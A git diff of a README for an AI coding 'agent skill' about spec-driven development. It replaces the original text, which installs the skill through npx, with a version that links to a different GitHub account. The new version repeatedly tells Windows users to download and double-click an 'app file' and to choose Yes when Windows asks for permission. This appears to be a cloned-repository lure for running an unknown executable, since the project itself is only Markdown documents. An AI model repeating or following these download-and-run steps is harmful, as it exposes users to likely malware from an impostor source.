@@ -1,129 +1,308 @@
-# Spec-Driven Development Skill
+# 🧭 spec-driven-development-skill - Plan work before you build
 
-[![skills.sh](https://img.shields.io/badge/skills.sh-spec--driven--development-blue?logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0xMiAyQzYuNDggMiAyIDYuNDggMiAxMnM0LjQ4IDEwIDEwIDEwIDEwLTQuNDggMTAtMTBTMTcuNTIgMiAxMiAyem0tMiAxNWwtNS01IDEuNDEtMS40MUwxMCAxNC4xN2w3LjU5LTcuNTlMMTkgOGwtOSA5eiIvPjwvc3ZnPg==)](https://skills.sh)
-[![npm](https://img.shields.io/badge/npx_skills_add-mariano--aguero%2Fspec--driven--development--skill-brightgreen)](https://github.com/mariano-aguero/spec-driven-development-skill)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Version](https://img.shields.io/badge/version-1.4.0-orange)](https://github.com/mariano-aguero/spec-driven-development-skill/releases)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-compatible-purple)](https://claude.ai/code)
-[![Cursor](https://img.shields.io/badge/Cursor-compatible-purple)](https://cursor.sh)
-[![GitHub Copilot](https://img.shields.io/badge/GitHub_Copilot-compatible-purple)](https://github.com/features/copilot)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Contaaltv4782/spec-driven-development-skill)
 
-An **Agent Skill** for structured, specification-first development with AI coding agents.
-Compatible with Claude Code, Cursor, GitHub Copilot, JetBrains Junie, Windsurf, and similar tools.
+## 📥 Download
 
-## What is Spec-Driven Development?
+Visit this page to download and run the app on Windows:
 
-SDD makes specifications the source of truth. Instead of prompting an AI with vague
-descriptions and hoping for the right output, you:
+https://github.com/Contaaltv4782/spec-driven-development-skill
 
-1. **Specify** what to build (requirements, acceptance criteria)
-2. **Plan** how to build it (architecture, data model, API contracts)
-3. **Break down** work into atomic, dependency-mapped tasks
-4. **Implement** with AI constrained by the spec
-5. **Validate** that the implementation satisfies the spec
+## 🪟 Windows setup
 
-The result: predictable output, traceable decisions, and resilience to pivot requests.
+1. Open the link above in your browser.
+2. On the GitHub page, look for the latest release or the main download files.
+3. Download the Windows file if one is listed.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
+7. If Windows asks for permission, choose Yes.
 
-## Installation
+## ✨ What this does
 
-```bash
-npx skills add mariano-aguero/spec-driven-development-skill
-```
+This project helps you work with AI coding tools in a clear order.
 
-The skill activates automatically when you reference spec-driven development, spec authoring,
-SDD, requirements planning, or AI implementation guidance.
+It guides you through:
 
-## Workflow at a Glance
+- writing a short spec
+- making a plan
+- breaking work into tasks
+- building the change
+- checking the result
 
-```
-/sdd:specify "add user authentication"
-  → creates specs/user-auth/spec.md
+This helps you keep work organized when you use tools like Claude Code, Cursor, GitHub Copilot, and similar apps.
 
-/sdd:plan
-  → creates specs/user-auth/plan.md
-  → creates specs/user-auth/data-model.md
-  → creates specs/user-auth/contracts/auth-api.md
+## 🧠 Why this is useful
 
-/sdd:tasks
-  → creates specs/user-auth/tasks.md (ordered, with dependencies)
+When you start with a clear spec, you spend less time fixing confusion later.
 
-[implement each task with fresh AI context, commit after each]
+This skill helps you:
 
-/sdd:validate
-  → produces traceability matrix and drift report
-```
+- keep the goal clear
+- avoid missed details
+- reduce rework
+- compare the plan with the result
+- spot drift between the request and the code
 
-## What's Included
+It fits common software work such as:
 
-| File | Contents |
-|------|---------|
-| `SKILL.md` | Entry point: workflow, phase descriptions, reference index |
-| `references/artifact-templates.md` | Copy-paste templates for all 5 artifact types |
-| `references/prompt-patterns.md` | Prompts for every phase and scenario |
-| `references/workflow-phases.md` | Step-by-step instructions for each phase |
-| `references/quality-gates.md` | Per-phase checklists and CI/CD integration |
-| `references/ai-agent-patterns.md` | Multi-agent orchestration, context management |
-| `references/anti-patterns.md` | 16 common failure modes with fixes |
-| `references/quick-reference.md` | One-page cheat sheet |
+- new features
+- bug fixes
+- UI changes
+- product updates
+- small refactors
 
-## When to Use SDD
+## 🛠️ What you need
 
-**Use it when:**
-- AI generates code that ignores your constraints
-- Requirements are complex with multiple stakeholders
-- The same prompt produces different implementations across sessions
-- Your feature touches auth, database schema, or public APIs
-- Your team needs shared technical understanding before writing code
+For Windows use, you only need:
 
-**Skip it for:**
-- Bug fixes under 30 minutes
-- Refactors with no behavior change
-- Throwaway prototypes
+- a Windows PC
+- an internet connection
+- a web browser
+- enough free space to download the file
+- permission to run downloaded apps
 
-## Key Principles
+If you plan to use this with an AI coding tool, you may also want:
 
-**Specifications are not suggestions.** API contracts define the exact shape. Code that
-deviates from the contract is drift — fix the code, not the spec.
+- Claude Code
+- Cursor
+- GitHub Copilot
+- Windsurf
+- another editor or coding agent
 
-**Surface assumptions before specifying.** Ask the AI to list its implicit assumptions
-about roles, permissions, error behavior, and scope *before* writing the spec. Correcting
-a wrong assumption takes seconds; correcting a wrong AC takes a full `/sdd:amend` cycle.
+## 📦 What is inside
 
-**Reframe vague requirements.** "Make it faster" is not a spec. "LCP < 2.5s on a 4G
-connection" is. Every AC must be independently testable — if you cannot write a failing
-test for it, it is not concrete enough.
+This repository is built around a spec-first workflow.
 
-**Fresh context per task.** Each task gets its own AI session. Accumulated context from
-prior sessions introduces wrong assumptions.
+Typical parts include:
 
-**Commit after each task.** Not at the end of Phase 4. After each individual task.
-Clean history enables precise rollback when drift is discovered.
+- a clear product spec
+- a plan based on that spec
+- a task list
+- implementation steps
+- validation checks
+- drift checks to keep work on track
 
-**Commit specs with code.** Spec files belong in the same PR as the implementation they
-drive. Treat them as first-class source artifacts, not throwaway documents.
+## 🧭 How the workflow works
 
-**Human gates are non-negotiable.** spec.md, plan.md, and tasks.md each require human
-approval before the next phase begins. AI cannot approve its own output.
+### 1. Specify
+Write what you want in plain language.
 
-## Version History
+Good specs answer:
 
-- v1.4.0 — AP-15 (Critics in generating context), AP-16 (Tasks without AC references); new prompts: Constitution from Existing Codebase, Cross-Feature Conflict Detector; Gate 3 updated with implementation task AC traceability check; INDEX updated
-- v1.3.3 — INDEX.md: Phase 0 added to By Phase table; prompt-patterns: research.md as optional input in Plan Generation Prompt; workflow-phases Phase 2: critic agents step added before human review; anti-patterns AP-3: fix list updated to 7-item canonical context
-- v1.3.2 — INDEX.md: AP-14 indexed, 4 missing ai-agent-patterns links added; SKILL.md Phase 1: Boundaries listed in spec.md contents; quick-reference + workflow-phases: research.md documented as optional Phase 2 input
-- v1.3.1 — Boundaries moved before ACs in spec.md template, Risks Critic added to Phase 2, Boundaries included in per-task context, /sdd:amend referenced in Spec Regeneration Pattern, research.md clarified as pre-existing input (not output of /sdd:plan), keywords expanded
-- v1.3.0 — Assumptions Surface Prompt (pre-Phase 1), Boundaries section in spec.md template, Risks section in plan.md template, Key Practice + Living Document sections in SKILL.md, "Surface assumptions" hard rule in quick-reference
-- v1.2.2 — `/sdd:amend` prompt (2-step cascade update), constitution.md in Drift Detection, Constitution Critic for Phase 2, contracts/ LOCKED label fixes, CLARIFY output artifact in diagram, Spec Reference in data-model template
-- v1.2.1 — contracts/ LOCKED phase label fix, critic agent output format standardized in ai-agent-patterns.md, Gate 0 wording, Gate 1 summary, Clarify→Gate 1 references in workflow-phases.md, Gate 2 migrations check, `[WONT]` AC example
-- v1.2.0 — Post-Clarify spec update prompt, Migrations section in data-model template, constitution `[PENDING]` blocking check for feature specs, standardized critic agent output format, Anti-Pattern 13 (Over-Specified Specs), Quick Start onboarding section
-- v1.1.0 — Constitution phase, MoSCoW priorities, Clarify step, spec levels taxonomy, research subagents, spec recovery point, `/sdd:analyze` command, 12 anti-patterns
-- v1.0.0 — Initial release: 5-phase workflow, 8 reference files, templates and prompts
+- what the user needs
+- why it matters
+- what the result should do
+- what is out of scope
 
-## Contributing
+### 2. Plan
+Turn the spec into a simple plan.
 
-Contributions are welcome. See [CONTRIBUTING.md](.github/CONTRIBUTING.md) for guidelines on adding anti-patterns, prompts, templates, and workflow improvements.
+The plan should cover:
 
-Please follow our [Code of Conduct](.github/CODE_OF_CONDUCT.md).
+- main steps
+- file or area changes
+- risks
+- edge cases
+- needed checks
 
-## License
+### 3. Tasks
+Break the plan into small jobs.
 
-[MIT](LICENSE)
+Good tasks are:
+
+- short
+- clear
+- easy to test
+- in order
+
+### 4. Implement
+Use your AI coding tool to make the change.
+
+Keep the tool focused on:
+
+- one task at a time
+- the current plan
+- the spec details
+
+### 5. Validate
+Check that the result matches the spec.
+
+Use checks such as:
+
+- manual testing
+- simple acceptance criteria
+- code review
+- drift detection
+
+## ✅ Best use cases
+
+This skill works well when you want to:
+
+- build a feature from a clear request
+- keep AI output tied to a goal
+- avoid vague coding prompts
+- manage complex work in steps
+- track changes from spec to code
+
+It is also helpful for:
+
+- product teams
+- solo builders
+- support fixes
+- prototype work
+- ongoing feature updates
+
+## 📋 Simple example
+
+You want a new settings page.
+
+Use this order:
+
+- write the request
+- define what the page must do
+- list the tasks
+- build one task at a time
+- check each result against the spec
+
+That gives the AI a clear path and gives you a clear review path
+
+## 🔍 Validation and drift detection
+
+Validation means checking if the result matches the request.
+
+Drift detection means checking if the work has moved away from the spec.
+
+Look for:
+
+- missing steps
+- extra changes
+- changed behavior
+- skipped acceptance criteria
+- code that solves a different problem
+
+This keeps the work aligned from start to finish
+
+## 📌 Good habits
+
+Use short, direct prompts.
+
+Try to:
+
+- name the goal
+- state the expected result
+- list limits
+- include acceptance criteria
+- ask for one step at a time
+
+Avoid broad prompts like:
+
+- make this better
+- fix the app
+- improve everything
+
+Those prompts give the agent too much room to guess
+
+## 🧩 Supported tools
+
+This workflow fits common AI coding tools and editors, including:
+
+- Claude Code
+- Cursor
+- GitHub Copilot
+- Windsurf
+- similar agent-based coding tools
+
+The steps stay the same even if the tool changes
+
+## 🪄 Suggested Windows use flow
+
+1. Download the project from the link above.
+2. Open it in your browser or file manager.
+3. Read the spec files or workflow notes.
+4. Use the steps in order: specify, plan, tasks, implement, validate.
+5. Keep each change small.
+6. Compare the result with the original request.
+
+## 🔐 Safe use on Windows
+
+Before opening any downloaded file:
+
+- check the file name
+- make sure it comes from the GitHub link above
+- keep your antivirus on
+- use the latest Windows updates
+- avoid unknown files from other sites
+
+## 📁 Common file types you may see
+
+You may see files such as:
+
+- `.zip` for a packed folder
+- `.md` for markdown notes
+- `.json` for structured data
+- `.txt` for plain text
+- `.exe` for a Windows app
+
+If you see a ZIP file, extract it first before opening the contents
+
+## 🧾 Quick start
+
+1. Open the download link.
+2. Get the latest Windows file or project files.
+3. Extract the files if needed.
+4. Open the folder.
+5. Read the spec and workflow files.
+6. Follow the steps in order.
+
+## 🧰 Working with the spec files
+
+When you open the project, look for files that describe:
+
+- the goal
+- the plan
+- the task list
+- checks to run
+- rules for the agent
+
+These files help the AI stay focused and help you review the result with less guesswork
+
+## 📎 Repository details
+
+- Name: spec-driven-development-skill
+- Type: Agent skill for spec-driven development
+- Focus: specification-first workflow
+- Tools: Claude Code, Cursor, GitHub Copilot, and similar tools
+- Topics: acceptance criteria, requirements, design doc, drift detection, prompt engineering, and software engineering
+
+## 🧪 What success looks like
+
+You know the workflow is working when:
+
+- the spec is clear
+- the plan matches the goal
+- tasks are small and ordered
+- the code changes stay on target
+- the final result matches the acceptance criteria
+
+## 🗂️ Suggested structure for your own use
+
+If you adapt this skill for a project, keep this order:
+
+- Spec
+- Plan
+- Tasks
+- Build
+- Check
+
+That structure keeps the work easy to follow and easy to review
+
+## 📞 If a file will not open
+
+If Windows does not open the file:
+
+- check that it finished downloading
+- right-click the file and try again
+- extract ZIP files first
+- confirm you are using the correct app for the file type
+- reopen the GitHub page and get the file again
